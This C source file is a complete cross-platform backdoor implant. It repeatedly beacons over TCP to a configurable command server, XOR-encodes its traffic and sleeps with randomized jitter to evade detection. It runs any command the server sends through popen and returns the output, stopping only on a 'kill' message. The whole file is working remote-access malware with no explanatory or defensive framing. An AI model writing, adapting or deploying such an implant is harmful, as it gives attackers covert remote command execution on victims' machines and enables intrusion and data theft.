#define _XOPEN_SOURCE 600
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
  #include <windows.h>
  #include <winsock2.h>
  #pragma comment(lib, "ws2_32.lib")
  #define SockClose(s) closesocket(s)
  #define SleepMs(ms)  Sleep(ms)
  typedef SOCKET       NetSock;
  #define SockInvalid  INVALID_SOCKET
#else
  #include <arpa/inet.h>
  #include <sys/socket.h>
  #include <unistd.h>
  #define SockClose(s) close(s)
  #define SleepMs(ms)  usleep((ms) * 1000)
  typedef int          NetSock;
  #define SockInvalid  (-1)
#endif

#define BufSize 4096
#define XorKey  0x5A

static void ApplyXor(char *Data, size_t Len)
{
    for (size_t I = 0; I < Len; I++)
        Data[I] ^= XorKey;
}

static void RunCommand(const char *Cmd, char *Out, size_t Max)
{
#ifdef _WIN32
    FILE *Pipe = _popen(Cmd, "r");
#else
    FILE *Pipe = popen(Cmd, "r");
#endif

    memset(Out, 0, Max);

    if (!Pipe) {
        snprintf(Out, Max, "[error] popen failed");
        return;
    }

    size_t Total = 0;
    char   Line[256];

    while (fgets(Line, sizeof(Line), Pipe)) {
        size_t Len = strlen(Line);
        if (Total + Len >= Max - 1) break;
        memcpy(Out + Total, Line, Len);
        Total += Len;
    }

    if (Total == 0)
        snprintf(Out, Max, "[ok] no output");

#ifdef _WIN32
    _pclose(Pipe);
#else
    pclose(Pipe);
#endif
}

static int Jitter(int Base, int PctVariance)
{
    int Delta = (Base * PctVariance) / 100;
    return (Base - Delta) + (rand() % (2 * Delta + 1));
}

static int Beacon(const char *Host, int Port, const char *Send, char *Recv)
{
#ifdef _WIN32
    WSADATA Wsa;
    if (WSAStartup(MAKEWORD(2, 2), &Wsa) != 0) return 0;
#endif

    NetSock Sock = socket(AF_INET, SOCK_STREAM, 0);
    if (Sock == SockInvalid) goto Fail;

    struct sockaddr_in Sin;
    memset(&Sin, 0, sizeof(Sin));
    Sin.sin_family      = AF_INET;
    Sin.sin_port        = htons((unsigned short)Port);
    Sin.sin_addr.s_addr = inet_addr(Host);

    if (connect(Sock, (struct sockaddr *)&Sin, sizeof(Sin)) < 0) goto Fail;

    char Enc[BufSize];
    size_t SendLen = strlen(Send);
    memcpy(Enc, Send, SendLen);
    ApplyXor(Enc, SendLen);
    send(Sock, Enc, (int)SendLen, 0);

    int N = recv(Sock, Recv, BufSize - 1, 0);
    if (N > 0) {
        Recv[N] = '\0';
        ApplyXor(Recv, (size_t)N);
        SockClose(Sock);
#ifdef _WIN32
        WSACleanup();
#endif
        return 1;
    }

Fail:
    if (Sock != SockInvalid) SockClose(Sock);
#ifdef _WIN32
    WSACleanup();
#endif
    return 0;
}

int main(int Argc, char *Argv[])
{
    srand((unsigned)time(NULL));

    char Host[256] = "127.0.0.1";
    int  Port      = 4444;

    for (int I = 1; I < Argc; I++) {
        if (strcmp(Argv[I], "-s") == 0 && I + 1 < Argc)
            strncpy(Host, Argv[I + 1], sizeof(Host) - 1);
        if (strcmp(Argv[I], "-p") == 0 && I + 1 < Argc)
            Port = atoi(Argv[I + 1]);
    }

    char Msg[BufSize]  = "Standby";
    char Resp[BufSize] = {0};

    while (1) {
        memset(Resp, 0, BufSize);

        if (!Beacon(Host, Port, Msg, Resp)) {
            strncpy(Msg, "Standby", BufSize - 1);
            SleepMs(Jitter(5000, 20));
            continue;
        }

        if (strcmp(Resp, "kill") == 0)
            break;

        if (strcmp(Resp, "SLEEP") == 0 || strlen(Resp) == 0) {
            strncpy(Msg, "Standby", BufSize - 1);
        } else {
            RunCommand(Resp, Msg, BufSize);
        }

        SleepMs(Jitter(3000, 15));
    }

    return 0;
}
